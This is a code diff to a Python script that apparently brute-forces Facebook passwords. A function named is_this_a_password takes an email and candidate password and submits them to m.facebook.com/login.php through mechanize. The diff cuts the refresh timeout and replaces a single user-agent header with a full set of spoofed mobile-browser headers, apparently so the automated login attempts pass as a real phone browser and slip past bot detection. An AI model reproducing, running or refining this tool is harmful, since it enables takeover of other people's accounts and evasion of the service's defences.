@@ -1,6 +1,6 @@
 import os.path
 
-import requests
+import requests, urllib
 import mechanize
 import sys,os,time
 from mechanize import Browser
@@ -25,8 +25,8 @@ MIN_PASSWORD_LENGTH = 6
 def is_this_a_password(email, index, password):
   br=mechanize.Browser()
   br.set_handle_robots(False)
-  br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=5) 
-  br.addheaders=[('User-Agent','Opera/9.80(Android;OperaMini/32.0.2254/85.U;id)Presto/2.12.423Version/12.16')]
+  br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1) 
+  br.addheaders=[('Host', 'm.facebook.com'),('Connection', 'keep-alive'),('sec-ch-ua', '" Not A;Brand";v="99", "Chromium";v="101"'),('sec-ch-ua-mobile', '?1'),('ec-ch-ua-platformm', '"Android"'),('Upgrade-Insecure-Requests', '1'),('User-Agent','Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'),('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'),('Accept-Language', 'en-US,en;q=0.9'),('Sec-Fetch-Site', 'none'),('Sec-Fetch-Mode', 'navigate'),('Sec-Fetch-User', '?1'),('Sec-Fetch-Dest', 'document'),('Accept-Encoding', 'gzip,deflate')]
   try:
     br.open('https://m.facebook.com/login.php')
   except:
